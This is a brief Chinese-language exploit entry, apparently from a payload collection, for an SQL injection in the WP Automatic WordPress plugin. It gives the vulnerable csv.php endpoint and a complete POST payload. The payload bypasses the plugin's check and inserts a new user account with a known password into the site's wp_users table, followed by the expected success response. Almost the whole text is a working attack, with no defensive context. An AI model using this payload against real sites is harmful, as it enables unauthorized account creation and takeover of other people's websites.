# WordPressAutomaticSQL注入漏洞

WordPress ｜ SQL注入 ｜ —
- **请求**：`POST /wp-content/plugins/wp-automatic/inc/csv.php HTTP/1.1`

**Payload**
```
q=INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, user_status) VALUES ('dudesite', MD5('dudesite'), 'dudesite', 'dudesite@localhost.org', NOW(), 0);&auth=%20&integ=5be638728303f002fd54450e5866dd28
```
- **响应特征**：200